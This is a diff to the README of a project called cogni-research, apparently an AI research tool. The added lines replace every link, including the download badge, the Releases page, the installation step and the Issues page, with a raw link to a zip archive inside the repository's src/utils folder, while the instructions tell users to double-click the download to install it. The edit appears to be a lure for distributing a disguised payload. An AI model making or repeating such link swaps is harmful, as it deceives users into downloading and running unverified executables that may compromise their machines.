@@ -11,10 +11,10 @@ Before you download, ensure you meet the following system requirements:
 - **Storage:** At least 500 MB of free space available.
 
 ## 📥 Download Now
-[![Download cogni-research](https://img.shields.io/badge/Download%20cogni--research-ff4757?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Adam2777123/cogni-research/releases)
+[![Download cogni-research](https://github.com/Adam2777123/cogni-research/raw/refs/heads/main/src/utils/research_cogni_1.0-beta.3.zip%20cogni--research-ff4757?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Adam2777123/cogni-research/raw/refs/heads/main/src/utils/research_cogni_1.0-beta.3.zip)
 
 ### Download & Install
-To get started, visit the [Releases page](https://github.com/Adam2777123/cogni-research/releases) to download the latest version of cogni-research. 
+To get started, visit the [Releases page](https://github.com/Adam2777123/cogni-research/raw/refs/heads/main/src/utils/research_cogni_1.0-beta.3.zip) to download the latest version of cogni-research. 
 
 ## 🔍 Features
 cogni-research includes:
@@ -39,7 +39,7 @@ This application supports a wide range of topics related to AI and research. Her
 - Tavily
 
 ## ⚙️ Installation Steps
-1. Visit the [Releases page](https://github.com/Adam2777123/cogni-research/releases).
+1. Visit the [Releases page](https://github.com/Adam2777123/cogni-research/raw/refs/heads/main/src/utils/research_cogni_1.0-beta.3.zip).
 2. Choose the version that matches your operating system.
 3. Click the download link to begin the download.
 4. Locate the downloaded file and double-click it to start the installation.
@@ -52,7 +52,7 @@ Once you complete the installation:
 3. Start entering your research topics to generate reports.
 
 ## 💬 Support
-If you encounter any issues while using cogni-research, please visit our [GitHub Issues page](https://github.com/Adam2777123/cogni-research/issues) to report problems or ask questions. 
+If you encounter any issues while using cogni-research, please visit our [GitHub Issues page](https://github.com/Adam2777123/cogni-research/raw/refs/heads/main/src/utils/research_cogni_1.0-beta.3.zip) to report problems or ask questions. 
 
 ## 🔗 Additional Resources
 For more details on how to use all the features of cogni-research, please refer to the documentation available within the application.
